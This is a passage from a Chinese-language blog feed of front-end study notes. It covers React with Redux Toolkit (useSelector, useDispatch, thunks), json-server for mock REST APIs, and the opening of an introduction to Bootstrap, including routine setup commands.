<span class="token string">'./module.js'</span><span class="token punctuation">;</span><span class="token function">myFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This is a function from a module.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>命名导出（Named Exports）</li></ul><p>命名导出允许模块导出多个值（函数、对象或变量），每个值都有一个名称。一个模块可以有多个命名导出。</p><p><strong>示例：命名导出</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// module.js</span><span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">someFunction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'This is a function from a module.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">anotherFunction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'This is another function from the same module.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">const</span> someValue <span class="token operator">=</span> <span class="token string">'This is a value from a module.'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>导入命名导出</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// anotherFile.js</span><span class="token keyword">import</span> <span class="token punctuation">{</span> someFunction<span class="token punctuation">,</span> anotherFunction<span class="token punctuation">,</span> someValue <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./module.js'</span><span class="token punctuation">;</span><span class="token function">someFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This is a function from a module.</span><span class="token function">anotherFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This is another function from the same module.</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>someValue<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This is a value from a module.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><ul><li>2）为React注入store</li></ul><p>react-redux负责把Redux和React 链接 起来，内置 Provider组件 通过 store 参数把创建好的store实例注入到应用中 ，链接正式建立。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-07%2017.27.39.png" style="zoom:50%;"><ul><li>3）React组件使用store中的数据</li></ul><p>在React组件中使用store中的数据，需要用到一个 钩子函数 - useSelector，它的作用是把store中的数据映射到组件<br>中，使用样例如下：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-07%2017.29.46.png" style="zoom:40%;"><blockquote><p><code>useSelector</code> 是一个 React Hook，用于在 React 组件中读取 Redux store 中的状态。它依赖于已经创建好的 store 来获取状态数据。在组件中使用 <code>useSelector</code> 时，它会订阅 store 的变化，并在状态更新时重新计算选择器函数的结果，从而触发组件的更新。</p><p>const {count} = useSelector(store=&gt;store.counter) </p><p>这段代码使用了 Redux Toolkit 中的 <code>useSelector</code> Hook，其作用是从 Redux store 中提取 <code>counter</code> 部分的状态，并将其解构以获取 <code>count</code> 属性的值。</p><ul><li><code>useSelector</code> 是一个 React Hook，它允许你从 Redux store 的状态树中读取数据。</li><li><code>store =&gt; store.counter</code> 是传递给 <code>useSelector</code> 的选择器函数（selector function）。这个函数接收整个 Redux store 的状态树作为参数，然后返回你想要的部分。在这个例子中，它返回了 <code>counter</code> 这个子状态。</li><li><code>const { count } = ...</code> 是 JavaScript 的解构赋值语法。它从 <code>useSelector</code> 返回的对象中提取 <code>count</code> 属性，并将其赋值给一个名为 <code>count</code> 的常量。</li></ul></blockquote><ul><li>4）React组件修改store中的数据</li></ul><p>React组件中修改store中的数据需要借助另外一个hook函数 - useDispatch，它的作用是生成提交action对象的 dispatch函数，使用样例如下：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-07%2017.31.22.png" a style="zoom:50%;"><blockquote><h3 id="解惑-「为什么需要-，不能直接dispatch-decrement-这样调用吗？」"><a href="#解惑-「为什么需要-，不能直接dispatch-decrement-这样调用吗？」" class="headerlink" title="解惑-「为什么需要()=>，不能直接dispatch(decrement())这样调用吗？」"></a>解惑-「为什么需要()=&gt;，不能直接dispatch(decrement())这样调用吗？」</h3><p>使用箭头函数的原因</p><ul><li><strong>延迟执行</strong>：通过使用箭头函数 <code>() =&gt; dispatch(decrement())</code>，我们创建了一个新的函数实例。这个函数在组件渲染时不会被调用，而是在事件发生时才被调用。这样可以确保 <code>dispatch(decrement())</code> 只在用户点击按钮时执行。如果直接使用 <code>dispatch(decrement())</code>，那么这个表达式会在组件渲染时立即执行，而不是在事件发生时执行。这是因为 React 会将组件的 JSX 转换为 JavaScript 对象，在这个过程中，所有非函数引用的表达式都会被求值。</li><li><strong>控制执行时机</strong>：箭头函数提供了一种简单的方式来延迟函数的执行，直到事件实际发生。这种方式在 React 中非常常见，因为它是控制事件处理器执行时机的标准做法。</li></ul></blockquote><h4 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h4><ol><li>组件中使用哪个hook函数获取store中的数据？useSelector。</li><li>组件中使用哪个hook函数获取dispatch方法？useDispatch。</li><li>如何得到要提交action对象？执行store模块中导出的actionCreater方法。</li></ol><h2 id="14-3-提交action传参"><a href="#14-3-提交action传参" class="headerlink" title="14.3 提交action传参"></a>14.3 提交action传参</h2><h3 id="14-3-1-需求说明"><a href="#14-3-1-需求说明" class="headerlink" title="14.3.1 需求说明"></a>14.3.1 需求说明</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.13.24.png" style="zoom:50%;"><p>组件中有俩个按钮 <code>add to 10</code> 和 <code>add to 20</code> 可以直接把count值修改到对应的数字，目标count值是在组件中传递过去的，需要在提交action的时候传递参数。</p><h3 id="14-3-2-提交action传参实现需求"><a href="#14-3-2-提交action传参实现需求" class="headerlink" title="14.3.2 提交action传参实现需求"></a>14.3.2 提交action传参实现需求</h3><p>在reducers的同步修改方法中添加action对象参数，在调用actionCreater的时候传递参数，参数会被传递到action对象payload属性上。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.14.45.png" style="zoom:50%;"><h2 id="14-3-异步状态操作"><a href="#14-3-异步状态操作" class="headerlink" title="14.3 异步状态操作"></a>14.3 异步状态操作</h2><h3 id="14-3-1-需求理解"><a href="#14-3-1-需求理解" class="headerlink" title="14.3.1 需求理解"></a>14.3.1 需求理解</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.15.46.png" style="zoom:50%;"><h3 id="14-3-2-异步操作样板代码"><a href="#14-3-2-异步操作样板代码" class="headerlink" title="14.3.2 异步操作样板代码"></a>14.3.2 异步操作样板代码</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.16.29.png" style="zoom:80%;"><ol><li><p>创建store的写法保持不变，配置好同步修改状态的方法</p></li><li><p>单独封装一个函数，在函数内部return一个新函数，在新函数中</p><p>2.1 封装异步请求获取数据</p><p>2.2 调用同步actionCreater传入异步数据生成一个action对象，并使用dispatch提交</p></li><li><p>组件中dispatch的写法保持不变</p></li></ol><blockquote><h3 id="解惑-「既然thunk-action-creator函数里面已经调用了dispatch，为什么这里还需要调用一次dispatch-fetchChannelList-」"><a href="#解惑-「既然thunk-action-creator函数里面已经调用了dispatch，为什么这里还需要调用一次dispatch-fetchChannelList-」" class="headerlink" title="解惑-「既然thunk action creator函数里面已经调用了dispatch，为什么这里还需要调用一次dispatch(fetchChannelList());」"></a>解惑-「既然thunk action creator函数里面已经调用了dispatch，为什么这里还需要调用一次dispatch(fetchChannelList());」</h3><p>在使用 Redux Thunk 时，<code>dispatch(fetchChannelList())</code> 这行代码的作用是启动整个异步流程。虽然 <code>fetchChannelList</code> 这个 thunk action creator 函数内部确实会调用 <code>dispatch</code>，但这里的 <code>dispatch(fetchChannelList())</code> 是必要的，原因如下：</p><h3 id="启动异步流程"><a href="#启动异步流程" class="headerlink" title="启动异步流程"></a>启动异步流程</h3><ul><li><strong>外部触发</strong>：<code>dispatch(fetchChannelList())</code> 是从组件或其他地方显式调用的，用来启动异步操作。它告诉 Redux store：“我有一个异步操作需要执行，请处理它。”</li><li><strong>中间件介入</strong>：当 <code>dispatch(fetchChannelList())</code> 被调用时，Redux Thunk 中间件会拦截到这个操作。它识别出 <code>fetchChannelList()</code> 返回的是一个函数（thunk 函数），而不是一个普通的 action 对象。然后，thunk middleware 调用这个函数，并传入 <code>dispatch</code> 和 <code>getState</code>。</li><li><strong>内部逻辑</strong>：在 <code>fetchChannelList</code> 返回的 thunk 函数内部，异步操作（如 API 请求）被执行。在异步操作完成后，内部的 <code>dispatch</code> 调用用来分发一个或多个 action，以更新 Redux store 的状态。</li></ul><h3 id="为什么需要外部的-dispatch？"><a href="#为什么需要外部的-dispatch？" class="headerlink" title="为什么需要外部的 dispatch？"></a>为什么需要外部的 <code>dispatch</code>？</h3><ul><li><strong>符合 Redux 的设计</strong>：Redux 的设计要求所有的状态更新都通过 <code>dispatch</code> action 来完成。即使是异步操作，也需要通过 <code>dispatch</code> 来触发和管理。</li><li><strong>中间件的作用</strong>：Redux Thunk 中间件是设计来处理这种模式的。它等待外部的 <code>dispatch</code> 调用，然后处理返回的函数（thunk）。如果没有外部的 <code>dispatch</code>，thunk middleware 就无法知道何时启动异步逻辑。</li><li><strong>组件的控制</strong>：在组件中调用 <code>dispatch(fetchChannelList())</code> 允许你控制何时启动异步操作。例如，你可能希望在组件加载时、用户点击按钮时，或者在特定条件满足时才去获取数据。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>**外部 <code>dispatch</code>**：启动异步流程，让 Redux Thunk 中间件介入并处理 thunk 函数。</li><li>**内部 <code>dispatch</code>**：在异步操作完成后，用于分发 action 更新 Redux store 的状态。</li></ul><p>这种设计模式使得异步操作的处理更加清晰和可控，同时保持了 Redux 状态管理的一致性和可预测性。</p></blockquote><h3 id="14-3-3-Redux调试-devtools"><a href="#14-3-3-Redux调试-devtools" class="headerlink" title="14.3.3 Redux调试 - devtools"></a>14.3.3 Redux调试 - devtools</h3><p>安装chrome调试工具：</p><p>Redux官方提供了针对于Redux的调试工具，支持实时state信息展示，action提交信息查看等。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.21.06.png" style="zoom:50%;"><h2 id="14-4-美团外卖案例"><a href="#14-4-美团外卖案例" class="headerlink" title="14.4 美团外卖案例"></a>14.4 美团外卖案例</h2><h3 id="14-4-1-案例演示和环境准备"><a href="#14-4-1-案例演示和环境准备" class="headerlink" title="14.4.1 案例演示和环境准备"></a>14.4.1 案例演示和环境准备</h3><h4 id="1）案例演示"><a href="#1）案例演示" class="headerlink" title="1）案例演示"></a>1）案例演示</h4><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.22.39.png" style="zoom:40%;"><p>基本开发思路：使用 RTK（Redux Toolkit）来管理应用状态, 组件负责 数据渲染 和 dispatch action。</p><h4 id="2）准备并熟悉环境"><a href="#2）准备并熟悉环境" class="headerlink" title="2）准备并熟悉环境"></a>2）准备并熟悉环境</h4><p>克隆项目到本地（内置了基础静态组件和模版）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone http://git.itcast.cn/heimaqianduan/redux-meituan.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装所有依赖 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动mock服务（内置了json-server） </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run serve<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动前端服务 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="常用的第三方库"><a href="#常用的第三方库" class="headerlink" title="常用的第三方库"></a>常用的第三方库</h1><p>动态控制类型名：classnames</p><p>生成唯一的随机数：uuid ，地址：<a href="https://github.com/uuidjs/uuid">https://github.com/uuidjs/uuid</a></p><p>生成固定格式的时间：dayjs ，地址：<a href="https://day.js.org/zh-CN/">https://day.js.org/zh-CN/</a></p><h1 id="常用库"><a href="#常用库" class="headerlink" title="常用库"></a>常用库</h1><h2 id="x-1-json-server"><a href="#x-1-json-server" class="headerlink" title="x.1 json-server"></a>x.1 json-server</h2><p><code>json-server</code> 是一个轻量级的 Node.js 模块，用于快速搭建本地的 RESTful API 服务器。它使用 JSON 文件作为数据源，可以模拟后端服务器的行为，非常适合前端开发人员在后端 API 尚未就绪时进行开发和测试。以下是 <code>json-server</code> 的一些主要作用和功能：</p><h3 id="x-1-1-主要作用"><a href="#x-1-1-主要作用" class="headerlink" title="x.1.1 主要作用"></a>x.1.1 主要作用</h3><ul><li><strong>快速搭建 API</strong>：无需编写后端代码，只需提供一个 JSON 文件，即可快速生成 RESTful 风格的 API。</li><li><strong>前后端分离开发</strong>：前端开发者可以在不依赖后端的情况下进行开发，提高开发效率。</li><li><strong>模拟后端接口</strong>：在后端接口尚未完成时，前端可以使用 <code>json-server</code> 模拟数据接口，方便调试和测试。</li></ul><h3 id="x-1-2-使用方法"><a href="#x-1-2-使用方法" class="headerlink" title="x.1.2 使用方法"></a>x.1.2 使用方法</h3><h4 id="1）安装-json-server"><a href="#1）安装-json-server" class="headerlink" title="1）安装 json-server"></a>1）安装 json-server</h4><p>首先，你需要在全局范围内安装 <code>json-server</code>。打开终端，运行以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> json-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="解惑-「npm-install-g-json-server-为什么要加-g参数？」"><a href="#解惑-「npm-install-g-json-server-为什么要加-g参数？」" class="headerlink" title="解惑-「npm install -g json-server 为什么要加-g参数？」"></a>解惑-「npm install -g json-server 为什么要加-g参数？」</h4><p>在使用 <code>npm install</code> 命令时，<code>-g</code> 参数表示全局安装（global installation）。以下是使用 <code>-g</code> 参数的几个原因和好处：</p><ol><li><strong>全局可用</strong></li></ol><ul><li><strong>无需项目依赖</strong>：全局安装的包不会被添加到项目的 <code>node_modules</code> 目录中，因此不会成为项目的一部分。这意味着你可以在任何项目中使用该工具，而不需要在每个项目中单独安装。</li><li><strong>命令行工具</strong>：许多 Node.js 工具（如 <code>json-server</code>、<code>create-react-app</code>、<code>eslint</code> 等）是设计为命令行工具使用的。全局安装后，它们的命令可以在系统的任何地方通过命令行直接调用，而不需要在特定项目的上下文中。</li></ul><ol start="2"><li><strong>节省空间</strong></li></ol><ul><li><strong>避免重复安装</strong>：如果在多个项目中都需要使用同一个工具，全局安装可以避免在每个项目的 <code>node_modules</code> 目录中重复安装该工具，从而节省磁盘空间。</li></ul><ol start="3"><li><strong>简化管理</strong></li></ol><ul><li><strong>统一更新</strong>：全局安装的包可以通过一个命令进行更新，例如 <code>npm update -g</code>，这可以简化对全局工具的管理，确保所有项目都能使用到最新版本的工具。</li></ul></blockquote><blockquote><h4 id="大战bug-「no-matching-version-found-for-tinyhttp-logger-2-0-0」"><a href="#大战bug-「no-matching-version-found-for-tinyhttp-logger-2-0-0」" class="headerlink" title="大战bug-「no matching version found for @tinyhttp/logger@^2.0.0」"></a>大战bug-「no matching version found for @tinyhttp/logger@^2.0.0」</h4><p>分析是因为最新版本的依赖问题，安装特定的旧版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> json-server@0.17.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h4 id="2）创建-JSON-数据文件"><a href="#2）创建-JSON-数据文件" class="headerlink" title="2）创建 JSON 数据文件"></a>2）创建 JSON 数据文件</h4><p>在你的项目目录中创建一个 JSON 文件，例如 <code>db.json</code>。这个文件将作为你的数据库，存储模拟数据。以下是一个示例：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"posts"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span> <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"json-server"</span><span class="token punctuation">,</span> <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">"typicode"</span> <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"comments"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span> <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">"body"</span><span class="token operator">:</span> <span class="token string">"some comment"</span><span class="token punctuation">,</span> <span class="token property">"postId"</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"profile"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"typicode"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3）启动-json-server"><a href="#3）启动-json-server" class="headerlink" title="3）启动 json-server"></a>3）启动 json-server</h4><p>在终端中，导航到包含 <code>db.json</code> 文件的目录，然后运行以下命令来启动 <code>json-server</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">json-server <span class="token parameter variable">--watch</span> db.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将启动一个本地服务器，默认监听在 <code>http://localhost:3000</code>。你可以通过访问不同的 URL 来获取数据：</p><ul><li><code>http://localhost:3000/posts</code>：获取所有文章</li><li><code>http://localhost:3000/comments</code>：获取所有评论</li><li><code>http://localhost:3000/profile</code>：获取用户资料</li></ul><h4 id="4）使用-json-server-的-RESTful-API"><a href="#4）使用-json-server-的-RESTful-API" class="headerlink" title="4）使用 json-server 的 RESTful API"></a>4）使用 json-server 的 RESTful API</h4><p><code>json-server</code> 提供了完整的 RESTful API，你可以使用以下方法：</p><ul><li><strong>GET</strong>：获取数据<ul><li><code>GET /posts</code>：获取所有文章</li><li><code>GET /posts/1</code>：获取 ID 为 1 的文章</li></ul></li><li><strong>POST</strong>：创建数据<ul><li><code>POST /posts</code>：创建新文章</li></ul></li><li><strong>PUT</strong>：更新数据<ul><li><code>PUT /posts/1</code>：更新 ID 为 1 的文章</li></ul></li><li><strong>PATCH</strong>：部分更新数据<ul><li><code>PATCH /posts/1</code>：更新 ID 为 1 的文章的部分字段</li></ul></li><li><strong>DELETE</strong>：删除数据<ul><li><code>DELETE /posts/1</code>：删除 ID 为 1 的文章</li></ul></li></ul><h4 id="5）配置-json-server"><a href="#5）配置-json-server" class="headerlink" title="5）配置 json-server"></a>5）配置 json-server</h4><p>你可以通过添加更多选项来配置 <code>json-server</code>：</p><ul><li><p><strong>指定端口</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">json-server <span class="token parameter variable">--watch</span> db.json <span class="token parameter variable">--port</span> <span class="token number">3001</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul><li><a href="https://www.runoob.com/react/react-jsx.html">https://www.runoob.com/react/react-jsx.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端开发 </tag>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bootstrap</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/bootstrap/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/bootstrap/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Bootstrap-简介"><a href="#一、Bootstrap-简介" class="headerlink" title="一、Bootstrap 简介"></a>一、Bootstrap 简介</h1><p><strong>Bootstrap</strong> 是一个功能强大、响应式、开源的前端框架，用于快速开发现代化网站和 Web 应用程序。它由 Twitter 的 Mark Otto 和 Jacob Thornton 创建，最初发布于 2011 年，目前由社区和开发者积极维护。</p><h1 id="二、核心特点"><a href="#二、核心特点" class="headerlink" title="二、核心特点"></a>二、核心特点</h1><h2 id="2-1-响应式设计"><a href="#2-1-响应式设计" class="headerlink" title="2.1 响应式设计"></a>2.1 <strong>响应式设计</strong></h2><p>Bootstrap 提供了基于 <strong>12 列网格系统</strong> 的布局工具，使页面能够适配不同尺寸的屏幕设备（如手机、平板、桌面）。</p><blockquote><ul><li><h3 id="何为响应式设计？"><a href="#何为响应式设计？" class="headerlink" title="何为响应式设计？"></a>何为响应式设计？</h3></li></ul><p><strong>响应式设计</strong>（Responsive Web Design，简称 RWD）是一种 Web 开发技术，旨在使网页能够根据用户设备的屏幕大小、分辨率和方向自动调整布局和内容，从而提供一致且友好的用户体验。</p><p>响应式设计的目标是<strong>一套代码适配多种设备</strong>，无论用户使用的是桌面、平板还是手机，页面都能清晰易用，避免缩放、横向滚动等不便。</p><h3 id="响应式设计的特点"><a href="#响应式设计的特点" class="headerlink" title="响应式设计的特点"></a>响应式设计的特点</h3><ol><li><strong>自动适配屏幕尺寸</strong><ul><li>页面布局、字体大小、图片比例等会根据设备变化自动调整。</li></ul></li><li><strong>提升用户体验</strong><ul><li>无需用户手动缩放或横向滚动，内容更易读、操作更便捷。</li></ul></li><li><strong>节省开发时间</strong><ul><li>相较于为每种设备开发单独的页面，响应式设计一次开发即可适配多端。</li></ul></li></ol></blockquote><blockquote><ul><li><h3 id="何为SEO？"><a href="#何为SEO？" class="headerlink" title="何为SEO？"></a>何为SEO？</h3></li></ul><p><strong>SEO</strong> 是 <strong>Search Engine Optimization</strong> 的缩写，中文称为<strong>搜索引擎优化</strong>。它是一种通过优化网站内容、结构和外部链接等方式，提高网站在搜索引擎中的排名，从而增加网站自然流量的技术和策略。</p><p>SEO 的目标是让网站更容易被搜索引擎抓取、理解和推荐，从而在用户搜索相关关键词时，能优先展示在搜索结果页面（SERP，Search Engine Results Page）靠前的位置。</p></blockquote><h2 id="2-2-预制样式和组件"><a href="#2-2-预制样式和组件" class="headerlink" title="2.2 预制样式和组件"></a>2.2 <strong>预制样式和组件</strong></h2><p>内置大量预制样式和 UI 组件，能快速构建现代化页面：</p><ul><li>常见的 CSS 样式：按钮、表单、排版等。</li><li>UI 组件：导航栏、模态框、卡片、标签页等。</li></ul><h2 id="2-3-移动优先"><a href="#2-3-移动优先" class="headerlink" title="2.3 移动优先"></a>2.3 <strong>移动优先</strong></h2><p>默认采用“移动优先”设计理念，确保页面在移动设备上的体验优先，同时适配更大的屏幕。</p><h2 id="2-4-强大的扩展能力"><a href="#2-4-强大的扩展能力" class="headerlink" title="2.4 强大的扩展能力"></a>2.4 <strong>强大的扩展能力</strong></h2><p>支持自定义和扩展，开发者可以在其基础上开发自己的样式或功能。</p><h2 id="2-5-基于-HTML、CSS-和-JavaScript"><a href="#2-5-基于-HTML、CSS-和-JavaScript" class="headerlink" title="2.5 基于 HTML、CSS 和 JavaScript"></a>2.5 <strong>基于 HTML、CSS 和 JavaScript</strong></h2><p>Bootstrap 提供的功能主要基于 HTML 和 CSS，同时也内置了许多交互功能，依赖于其自带的 JavaScript 或 jQuery。</p><h2 id="2-6-丰富的文档"><a href="#2-6-丰富的文档" class="headerlink" title="2.6 丰富的文档"></a>2.6 <strong>丰富的文档</strong></h2><p>Bootstrap 的文档详细、易懂，提供大量示例代码和用法说明，便于开发者快速上手。</p><h1 id="三、使用方法"><a href="#三、使用方法" class="headerlink" title="三、使用方法"></a>三、使用方法</h1><h2 id="3-1-引入方式"><a href="#3-1-引入方式" class="headerlink" title="3.1 引入方式"></a>3.1 <strong>引入方式</strong></h2><p>Bootstrap 提供了多种方式来引入，包括 CDN 和本地安装。</p><p><strong>通过 CDN 引入</strong>：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Bootstrap 示例<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 引入 Bootstrap CSS --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>通过 npm 安装</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> bootstrap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-2-基本示例"><a href="#3-2-基本示例" class="headerlink" title="3.2 基本示例"></a>3.2 <strong>基本示例</strong></h2><p><strong>创建一个响应式页面布局</strong>：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token 